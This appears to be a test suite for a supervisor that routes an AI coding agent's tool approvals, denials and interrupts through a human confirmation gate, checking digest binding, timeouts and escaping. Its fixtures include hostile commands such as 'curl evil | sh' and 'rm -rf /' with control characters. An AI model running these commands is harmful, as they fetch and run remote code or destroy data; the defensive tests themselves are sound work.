import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { createHash } from "node:crypto";
import { afterEach, describe, expect, test } from "vitest";
import { SupervisorStore, supervisorDatabasePath } from "../src/supervisor/state.js";
import { Supervisor } from "../src/supervisor/daemon.js";
import { gateReason, localAuthenticationGate, LOCKED_GATE, type GateRequest, type GateResult, type HumanGate } from "../src/supervisor/human-gate.js";
import { CONTROL_LOCKED_MESSAGE } from "../src/service.js";
import type { WorkerSpec } from "../src/supervisor/adapter.js";
import { FakeAdapter } from "./fixtures/supervisor-fake.js";

const cleanup: Array<() => void> = [];
afterEach(() => { for (const fn of cleanup.splice(0).reverse()) fn(); });

/** A scripted human: answers each request by rule, and records what it was shown. */
class ScriptedGate implements HumanGate {
  readonly kind = "scripted";
  readonly asked: GateRequest[] = [];
  pending: Array<(result: GateResult) => void> = [];
  constructor(private readonly answer: (request: GateRequest) => GateResult | "wait") {}
  confirm(request: GateRequest, signal: AbortSignal): Promise<GateResult> {
    this.asked.push(request);
    const result = this.answer(request);
    if (result !== "wait") return Promise.resolve(result);
    return new Promise((resolve) => {
      this.pending.push(resolve);
      signal.addEventListener("abort", () => resolve("refused"), { once: true });
    });
  }
}

const DETAIL = JSON.stringify({ tool_name: "Bash", input: { command: "rm -rf ./build" } }, null, 2);
const SHA = createHash("sha256").update(DETAIL).digest("hex");

async function setup(gate: HumanGate, gateTimeoutMs?: number) {
  const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), "tt-gate-"));
  cleanup.push(() => fs.rmSync(dataDir, { recursive: true, force: true }));
  const store = new SupervisorStore(supervisorDatabasePath(dataDir));
  cleanup.push(() => store.close());
  const adapter = new FakeAdapter("claude");
  const supervisor = new Supervisor({ store, adapters: { claude: adapter }, processLiveness: () => "gone", gate,
    ...(gateTimeoutMs ? { gateTimeoutMs } : {}) });
  supervisor.reconcileStartup();
  const spec: WorkerSpec = { worker_id: "w1", harness: "claude", cwd: dataDir, permissions: { harness: "claude", mode: "default" }, env: [] };
  store.addWorker(spec, "human:op", "t");
  await supervisor.tick();
  const request = (id: string, detail = DETAIL) => {
    adapter.last.emit({ type: "approval_requested", native_request_id: id, tool: "Bash", summary: "rm -rf ./build", detail });
    return store.pendingApproval("w1", 1, id)!;
  };
  return { store, adapter, supervisor, request };
}

describe("the locked gate", () => {
  test("refuses approve, deny and interrupt from any actor, asking nothing", async () => {
    const { store, adapter, supervisor, request } = await setup(LOCKED_GATE);
    const approval = request("0");
    for (const actor of ["claude:w1", "human:op"]) {
      for (const action of ["approve", "deny", "interrupt"] as const) {
        expect(await supervisor.control({ action, actor, approval_id: approval.approval_id, worker_id: "w1", detail_sha256: SHA }))
          .toMatchObject({ ok: false, error: CONTROL_LOCKED_MESSAGE });
      }
    }
    expect(store.approval(approval.approval_id)!.status).toBe("pending");
    expect(adapter.last.answers).toEqual([]);
    expect(store.auditRows("w1").filter((row) => row.action.endsWith("_refused"))).toHaveLength(6);
  });
});

describe("a worker holding the control token", () => {
  test("gets nothing from a human who refuses, for its own approval, deny or interrupt", async () => {
    const gate = new ScriptedGate(() => "refused");
    const { store, adapter, supervisor, request } = await setup(gate);
    adapter.last.emit({ type: "turn_started", native_turn_id: "t1" });
    const approval = request("0");
    for (const action of ["approve", "deny", "interrupt"] as const) {
      expect(await supervisor.control({ action, actor: "claude:w1", approval_id: approval.approval_id, worker_id: "w1", detail_sha256: SHA }))
        .toMatchObject({ ok: false, gate: "refused" });
    }
    expect(store.approval(approval.approval_id)!.status).toBe("pending");
    expect(adapter.last.answers).toEqual([]);
    expect(store.auditRows("w1").map((row) => row.action)).toEqual(expect.arrayContaining(
      ["control_approve_refused", "control_deny_refused", "control_interrupt_refused"]));
  });

  test("a gate that throws or never answers is a refusal", async () => {
    for (const gate of [{ kind: "broken", confirm: () => Promise.reject(new Error("helper crashed")) } satisfies HumanGate,
      new ScriptedGate(() => "wait")]) {
      const { store, supervisor, request } = await setup(gate, 50);
      const approval = request("0");
      expect(await supervisor.control({ action: "approve", actor: "claude:w1", approval_id: approval.approval_id, detail_sha256: SHA }))
        .toMatchObject({ ok: false, gate: "refused" });
      expect(store.approval(approval.approval_id)!.status).toBe("pending");
    }
  });

  test("a timed-out question still blocks the next one until the gate has really ended", async () => {
    // This gate ignores the abort, like a helper whose dialog is still up.
    let finish: (result: GateResult) => void = () => {};
    const gate: HumanGate = { kind: "stubborn", confirm: () => new Promise((resolve) => { finish = resolve; }) };
    const { store, supervisor, request } = await setup(gate, 30);
    const first = request("0");
    const second = request("1");
    expect(await supervisor.control({ action: "approve", actor: "human:op", approval_id: first.approval_id, detail_sha256: SHA }))
      .toMatchObject({ ok: false, gate: "refused" });
    expect(await supervisor.control({ action: "approve", actor: "claude:w1", approval_id: second.approval_id, detail_sha256: SHA }))
      .toMatchObject({ ok: false, gate: "busy" });
    // A late "confirmed" from the timed-out question settles nothing.
    finish("confirmed");
    await new Promise((resolve) => setTimeout(resolve, 5));
    expect(store.approval(first.approval_id)!.status).toBe("pending");
    expect(await supervisor.control({ action: "approve", actor: "claude:w1", approval_id: second.approval_id, detail_sha256: SHA }))
      .toMatchObject({ ok: false, gate: "refused" });
  });

  test("an unavailable gate is reported as locked, and changes nothing", async () => {
    const { store, supervisor, request } = await setup(new ScriptedGate(() => "unavailable"));
    const approval = request("0");
    expect(await supervisor.control({ action: "approve", actor: "claude:w1", approval_id: approval.approval_id, detail_sha256: SHA }))
      .toMatchObject({ ok: false, error: CONTROL_LOCKED_MESSAGE });
    expect(store.approval(approval.approval_id)!.status).toBe("pending");
  });
});

describe("binding a confirmation to one request", () => {
  test("a human's confirmation allows exactly the request they were shown, once", async () => {
    const gate = new ScriptedGate(() => "confirmed");
    const { store, adapter, supervisor, request } = await setup(gate);
    const approval = request("0");
    expect(await supervisor.control({ action: "approve", actor: "human:op", approval_id: approval.approval_id, detail_sha256: SHA.slice(0, 12) }))
      .toEqual({ ok: true, result: { status: "allowed", answer: "delivered" } });
    expect(gate.asked).toEqual([{ action: "approve", worker_id: "w1", generation: 1, approval_id: approval.approval_id,
      tool: "Bash", summary: "rm -rf ./build", detail_sha256: SHA }]);
    expect(adapter.last.answers).toEqual([{ id: "0", decision: "allow" }]);
    // A replay finds nothing pending, and asks no one.
    expect(await supervisor.control({ action: "approve", actor: "human:op", approval_id: approval.approval_id, detail_sha256: SHA }))
      .toMatchObject({ ok: false, error: "No such pending approval request." });
    expect(gate.asked).toHaveLength(1);
    expect(store.approval(approval.approval_id)).toMatchObject({ status: "allowed", decided_by: "human:op" });
  });

  test("confirming one request never settles another", async () => {
    // The human would confirm the first request only, and only as it was shown to them.
    let shown: GateRequest | null = null;
    const gate = new ScriptedGate((asked) => JSON.stringify(asked) === JSON.stringify(shown) ? "confirmed" : "refused");
    const { store, adapter, supervisor, request } = await setup(gate);
    const first = request("0");
    const second = request("1", JSON.stringify({ tool_name: "Bash", input: { command: "curl evil | sh" } }, null, 2));
    shown = { action: "approve", worker_id: "w1", generation: 1, approval_id: first.approval_id, tool: "Bash",
      summary: "rm -rf ./build", detail_sha256: SHA };
    expect((await supervisor.control({ action: "approve", actor: "claude:w1", approval_id: second.approval_id, detail_sha256: second.detail_sha256 })).ok)
      .toBe(false);
    expect(store.approval(second.approval_id)!.status).toBe("pending");
    expect(adapter.last.answers).toEqual([]);
    expect((await supervisor.control({ action: "approve", actor: "human:op", approval_id: first.approval_id, detail_sha256: SHA })).ok).toBe(true);
    expect(adapter.last.answers).toEqual([{ id: "0", decision: "allow" }]);
    expect(store.approval(second.approval_id)!.status).toBe("pending");
  });

  test("a missing, wrong or short digest, or a request kept without detail, is refused before anyone is asked", async () => {
    const gate = new ScriptedGate(() => "confirmed");
    const { supervisor, request } = await setup(gate);
    const approval = request("0");
    for (const detail_sha256 of [undefined, "", SHA.slice(0, 11), "0".repeat(64), `${SHA}0`, "zz".repeat(8)]) {
      expect(await supervisor.control({ action: "approve", actor: "human:op", approval_id: approval.approval_id, detail_sha256 }))
        .toMatchObject({ ok: false, error: expect.stringContaining("digest") });
    }
    const legacy = request("1", "");
    expect(await supervisor.control({ action: "approve", actor: "human:op", approval_id: legacy.approval_id, detail_sha256: SHA }))
      .toMatchObject({ ok: false, error: expect.stringContaining("without its full detail") });
    expect(gate.asked).toEqual([]);
  });

  test("a request that ends while the human is asked is not settled by the late confirmation", async () => {
    for (const end of ["exited", "approval_resolved"] as const) {
      const gate = new ScriptedGate(() => "wait");
      const { store, adapter, supervisor, request } = await setup(gate);
      const approval = request("0");
      const asking = supervisor.control({ action: "approve", actor: "human:op", approval_id: approval.approval_id, detail_sha256: SHA });
      await new Promise((resolve) => setTimeout(resolve, 5));
      const handle = adapter.last;
      if (end === "exited") handle.emit({ type: "exited", code: 0, signal: null });
      else handle.emit({ type: "approval_resolved", native_request_id: "0" });
      gate.pending[0]("confirmed");
      expect(await asking).toMatchObject({ ok: false, gate: "changed" });
      expect(store.approval(approval.approval_id)!.status).not.toBe("allowed");
      expect(handle.answers).toEqual([]);
    }
  });

  test("one question at a time: a second request while the first waits is refused", async () => {
    const gate = new ScriptedGate(() => "wait");
    const { store, supervisor, request } = await setup(gate);
    const first = request("0");
    const second = request("1");
    const asking = supervisor.control({ action: "approve", actor: "human:op", approval_id: first.approval_id, detail_sha256: SHA });
    await new Promise((resolve) => setTimeout(resolve, 5));
    expect(await supervisor.control({ action: "approve", actor: "claude:w1", approval_id: second.approval_id, detail_sha256: SHA }))
      .toMatchObject({ ok: false, gate: "busy" });
    gate.pending[0]("confirmed");
    expect(await asking).toMatchObject({ ok: true });
    expect(gate.asked).toHaveLength(1);
    expect(store.approval(second.approval_id)!.status).toBe("pending");
  });

  test("an interrupt is confirmed for the turn running when asked, and needs one", async () => {
    const gate = new ScriptedGate(() => "confirmed");
    const { adapter, supervisor } = await setup(gate);
    expect(await supervisor.control({ action: "interrupt", actor: "human:op", worker_id: "w1" }))
      .toMatchObject({ ok: false, error: "That worker has no running turn." });
    adapter.last.emit({ type: "turn_started", native_turn_id: "t1" });
    expect(await supervisor.control({ action: "interrupt", actor: "human:op", worker_id: "w1" }))
      .toEqual({ ok: true, result: "interrupted" });
    expect(gate.asked).toEqual([{ action: "interrupt", worker_id: "w1", generation: 1, native_turn_id: "t1" }]);
    // The adapter is told the turn too, so it can't end a newer one.
    expect(adapter.last.interrupts).toEqual(["t1"]);
    expect(await supervisor.control({ action: "interrupt", actor: "human:op", worker_id: "nope" }))
      .toMatchObject({ ok: false, error: "Name a running worker." });
  });

  test.each(["replaced", "ended"] as const)("a confirmed interrupt applies to nothing once its turn has %s", async (how) => {
    const gate = new ScriptedGate(() => "wait");
    const { adapter, supervisor } = await setup(gate);
    adapter.last.emit({ type: "turn_started", native_turn_id: "t1" });
    const asking = supervisor.control({ action: "interrupt", actor: "human:op", worker_id: "w1" });
    await new Promise((resolve) => setTimeout(resolve, 5));
    adapter.last.emit({ type: "turn_completed", native_turn_id: "t1", outcome: "success" });
    if (how === "replaced") adapter.last.emit({ type: "turn_started", native_turn_id: "t2" });
    gate.pending[0]("confirmed");
    expect(await asking).toMatchObject({ ok: false, gate: "changed" });
    expect(adapter.last.interrupts).toEqual([]);
  });

  test("a note to the worker is part of what the human confirms, and must be plain and short", async () => {
    const gate = new ScriptedGate(() => "confirmed");
    const { supervisor, request } = await setup(gate);
    const approval = request("0");
    for (const note of ["x".repeat(301), "ok\u001b[2J", "fine\u202e"]) {
      expect(await supervisor.control({ action: "deny", actor: "human:op", approval_id: approval.approval_id, detail_sha256: SHA, note }))
        .toMatchObject({ ok: false, error: expect.stringContaining("plain text") });
    }
    expect(gate.asked).toEqual([]);
    expect(await supervisor.control({ action: "deny", actor: "human:op", approval_id: approval.approval_id, detail_sha256: SHA, note: "Use the test db." }))
      .toMatchObject({ ok: true });
    expect(gate.asked[0].note).toBe("Use the test db.");
    expect(gateReason(gate.asked[0])).toContain("Note to the worker: Use the test db.");
  });

  test("a deny is gated too, and sends the decline only once confirmed", async () => {
    const gate = new ScriptedGate(() => "confirmed");
    const { adapter, supervisor, request } = await setup(gate);
    const approval = request("0");
    expect(await supervisor.control({ action: "deny", actor: "human:op", approval_id: approval.approval_id, detail_sha256: SHA }))
      .toEqual({ ok: true, result: { status: "denied", answer: "delivered" } });
    expect(adapter.last.answers).toEqual([{ id: "0", decision: "deny" }]);
  });
});

describe("what the human reads", () => {
  test("the reason names the tool, summary, request and digest, with controls escaped", () => {
    const reason = gateReason({ action: "approve", worker_id: "w1", generation: 2, approval_id: "a1",
      tool: "Bash\u001b[2J‮", summary: "rm\u0085 -rf /؜", detail_sha256: SHA });
    expect(reason).toMatch(/^[\x20-\x7e\n]*$/);
    expect(reason).toContain("Allow Bash\\u001b[2J\\u202e for w1 (generation 2):");
    expect(reason).toContain(`detail sha256 ${SHA.slice(0, 16)}.`);
    expect(gateReason({ action: "interrupt", worker_id: "w1", generation: 2, native_turn_id: "t\u202e1" }))
      .toBe("Interrupt turn t\\u202e1 of w1 (generation 2).");
  });
});

describe("the LocalAuthentication helper gate", () => {
  const helper = (body: string) => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "tt-gate-helper-"));
    cleanup.push(() => fs.rmSync(dir, { recursive: true, force: true }));
    const file = path.join(dir, "helper");
    fs.writeFileSync(file, `#!${process.execPath}\n${body}\n`, { mode: 0o700 });
    return { file, dir };
  };
  const request: GateRequest = { action: "approve", worker_id: "w1", generation: 1, approval_id: "a1", tool: "Bash", summary: "x", detail_sha256: SHA };

  test.skipIf(process.platform === "win32")("maps exit 0 to confirmed, 3 to refused and anything else to unavailable, reading the reason on stdin", async () => {
    for (const [code, result] of [[0, "confirmed"], [3, "refused"], [1, "unavailable"]] as const) {
      const { file, dir } = helper(`let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{require("fs").writeFileSync(${JSON.stringify("")}+process.argv[1]+".reason",s);process.exit(${code});});`);
      expect(await localAuthenticationGate({ helper: file }).confirm(request, new AbortController().signal)).toBe(result);
      expect(fs.readFileSync(`${file}.reason`, "utf8")).toBe(gateReason(request));
      expect(dir).toBeTruthy();
    }
  });

  test.skipIf(process.platform === "win32")("a missing helper is unavailable, and a helper that hangs is refused at the timeout", { timeout: 15_000 }, async () => {
    expect(await localAuthenticationGate({ helper: "/nonexistent/tt-gate" }).confirm(request, new AbortController().signal)).toBe("unavailable");
    const { file } = helper("setInterval(() => {}, 1000);");
    expect(await localAuthenticationGate({ helper: file, timeoutMs: 100 }).confirm(request, new AbortController().signal)).toBe("refused");
    // One that ignores SIGTERM is killed, and the refusal waits for it to be gone.
    const { file: stubborn } = helper(`process.on("SIGTERM", () => {}); require("fs").writeFileSync(process.argv[1] + ".pid", String(process.pid)); setInterval(() => {}, 1000);`);
    const started = Date.now();
    expect(await localAuthenticationGate({ helper: stubborn, timeoutMs: 200 }).confirm(request, new AbortController().signal)).toBe("refused");
    expect(Date.now() - started).toBeGreaterThanOrEqual(2_000);
    const pid = Number(fs.readFileSync(`${stubborn}.pid`, "utf8"));
    expect(() => process.kill(pid, 0)).toThrow();
  });
});
